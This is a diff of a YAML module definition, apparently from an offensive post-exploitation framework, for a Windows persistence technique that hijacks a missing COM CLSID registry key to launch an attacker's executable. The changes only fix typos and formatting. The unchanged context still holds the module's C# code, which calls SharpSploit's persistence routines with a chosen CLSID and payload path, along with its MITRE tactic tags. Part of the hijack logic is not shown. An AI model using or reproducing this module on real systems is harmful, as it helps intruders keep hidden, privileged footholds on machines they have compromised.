@@ -3,7 +3,9 @@ authors:
   - name: Anthony Rose
     handle: Cx01N
     link: https://twitter.com/Cx01N_
-description: Hijacks a CLSID key to execute a payload for persistence. Requires that an installed program or service attempts to load a missing CLSID. If scucesful the executable is launched at the privlege level of the targeted program or service.   
+description: Hijacks a CLSID key to execute a payload for persistence. Requires that
+  an installed program or service attempts to load a missing CLSID. If successful
+  the executable is launched at the privilege level of the targeted program or service.
 software: ''
 tactics: [TA0003]
 techniques: [T1546.015]
@@ -28,25 +30,20 @@ options:
     suggested_values: []
 csharp:
   UnsafeCompile: false
-  CompatibleDotNetVersions:
-    - Net35
-    - Net40
+  CompatibleDotNetVersions: [Net35, Net40]
   Code: |
     using System;
     using System.IO;
     using SharpSploit.Persistence;
-
     public static class Program
     {
         public static void Main(string[] args)
         {
             string clsid = args.Length > 0 ? args[0] : "";
             string executablePath = args.Length > 1 ? args[1] : "";
-
             string result = HijackComClsid(clsid, executablePath);
             Console.WriteLine(result);
         }
-
         public static string HijackComClsid(string clsid, string executablePath)
         {
             using (StringWriter stringWriter = new StringWriter())
@@ -66,7 +63,6 @@ csharp:
                 {
                     stringWriter.WriteLine(e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace);
                 }
-
                 return stringWriter.ToString();
             }
         }
@@ -76,9 +72,7 @@ csharp:
       Description: SharpSploit is a library for C# post-exploitation modules.
       Location: SharpSploit\SharpSploit\
       Language: CSharp
-      CompatibleDotNetVersions:
-        - Net35
-        - Net40
+      CompatibleDotNetVersions: [Net35, Net40]
       ReferenceAssemblies:
         - Name: System.Management.Automation.dll
           Location: net35\System.Management.Automation.dll
